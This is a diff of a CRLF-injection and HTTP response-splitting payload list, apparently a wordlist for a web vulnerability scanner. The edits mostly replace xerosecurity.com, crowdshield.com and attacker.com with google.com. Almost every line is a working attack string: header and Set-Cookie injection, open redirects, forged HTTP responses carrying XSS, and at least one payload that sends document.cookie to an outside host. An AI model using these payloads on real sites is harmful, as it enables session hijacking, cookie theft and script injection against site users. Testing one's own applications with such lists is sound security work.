@@ -40,9 +40,9 @@ crlf%0A%20Header-Test:PROVIESEC
 \r\n Header-Test:PROVIESEC
 PROVIESEC%250aXTest%3APROVIESEC
 PROVIESEC%0dXTest%3APROVIESEC
-PROVIESEC%0d%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0d%0d%0a%0a
+PROVIESEC%0d%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fgoogle.com%2F.testing%2Fiframe_injection.php%0d%0d%0a%0a
 PROVIESEC%0aSet-Cookie: INJECT=PROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
-PROVIESEC%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0a%0a
+PROVIESEC%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fgoogle.com%2F.testing%2Fiframe_injection.php%0a%0a
 HTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0aContent-Length:+132%0d%0aContent-Encoding:+deflate%0d%0d%0a%0aD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEt33sGDttwGDDDGG03sDGGwGGtDtt33333sG03333sDDdFPcOKwGWoSsgkwoemUcMOKwGWoS4
 HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encoding:+deflate%0a%0aD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEt33sGDttwGDDDGG03sDGGwGGtDtt33333sG03333sDDdFPcOKwGWoSsgkwoemUcMOKwGWoS4
 <h1\>PROVIESEC</h1\>
@@ -51,9 +51,9 @@ HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encodi
 /www.google.com/%2E%2E%2F%0D%0AHeader-Test:PROVIESEC
 /test/%2e%2e/tr
 /google.com/%2F..%0D%0AHeader-Test:PROVIESEC
-//www.xerosecurity.com/%2E%2E%0dSet-Cookie: PROVIESEC=PROVIESEC
-//www.xerosecurity.com/%2E%2E%0d%0a%20Set-Cookie: PROVIESEC=PROVIESEC
-//www.xerosecurity.com/%2E%2E%0aSet-Cookie: PROVIESEC=PROVIESEC
+//www.google.com/%2E%2E%0dSet-Cookie: PROVIESEC=PROVIESEC
+//www.google.com/%2E%2E%0d%0a%20Set-Cookie: PROVIESEC=PROVIESEC
+//www.google.com/%2E%2E%0aSet-Cookie: PROVIESEC=PROVIESEC
 //www.google.com/%2F%2E%2E%0D%0AHeader-Test:PROVIESEC
 //crowdshield.com%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20222%0d%0a<script>alert%28%27PROVIESEC%27%29<%2fscript>%0d%0a%0d%0a
 //////www.xerosecurity.com/%2e%2e/tr
@@ -81,10 +81,10 @@ HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encodi
 %3F%0DHeader-Test:PROVIESEC
 %3F%0D%0AHeader-Test:PROVIESEC
 %3F%0AHeader-Test:PROVIESEC
-%2fwww.xerosecurity.com%2f%2e%2e/tr
+%2fwww.google.com%2f%2e%2e/tr
 %2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(PROVIESEC)%3c/script%3e%2F..%2F..%2F..%2F../
-%2F%2crowdshield.com%0aContent-Type%3Atext%2Fhtml%0aContent-Length%0a222%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
-%2F%2Fcrowdshield.com%0d%0aContent-Type%3Atext%2Fhtml%0d%0aContent-Length%0d%0a222%0d%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
+%2F%2google.com%0aContent-Type%3Atext%2Fhtml%0aContent-Length%0a222%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
+%2F%2Fgoogle.com%0d%0aContent-Type%3Atext%2Fhtml%0d%0aContent-Length%0d%0a222%0d%0a%3Cscript%3Ealert('XSSPOSED')%3C%2Fscript%22%3E
 %25250AHeader-Test:PROVIESEC
 %250a%250d%20
 %250a%250d
@@ -124,11 +124,10 @@ HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encodi
 %0d%0aSet-Cookie: PROVIESEC=x%0aX:PROVIESEC
 %0d%0aSet-Cookie: PROVIESEC=PROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
 %0d%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0d%0a%0d%0a
-%0d%0aReferer:%20https://crowdshield.com/PROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-%0d%0aLocation:%20http://attacker.com
+%0d%0aReferer:%20https://google.com/PROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+%0d%0aLocation:%20http://google.com
 %0d%0aContent-Length:%200%0d%0d%0a%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0d%0a%0a<html>Hacked</html>
 %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
-%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%20769%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0d%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%22)%3B%3E%0d%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.html%22)%3B%3E%0d%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
 %0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0d%0aContent-Length%3A%2052%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
 %0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0d%0aContent-Length%3A%2040%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
 %0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aContent-Type%3A%20text%2Fhtml%0d%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0d%0aContent-Length%3A%2048%0d%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
@@ -142,12 +141,11 @@ HTTP/1.1+200+OK%0aContent-Type:+text/html%0aContent-Length:+132%0aContent-Encodi
 %0aSet-Cookie: PROVIESEC=PROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
 %0aSet-Cookie: PROVIESEC=PROVIESEC%0aX:PROVIESEC
 %0aSet-Cookie: PROVIESEC=PROVIESEC
-%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0a%0a
+%0aSet-Cookie%3AINJECT%3DPROVIESECXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fgoogle.com%2F.testing%2Fiframe_injection.php%0a%0a
 %0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aLast-Modified%3A%20Fri%2C%2006%20Mar%202017%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
-%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%20769%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%22)%3B%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.html%22)%3B%3E%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
 %0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%2052%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
 %0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
-%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fcrowdshield.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fgoogle.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
 %0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
 %0a%20
 %0a%0dtest
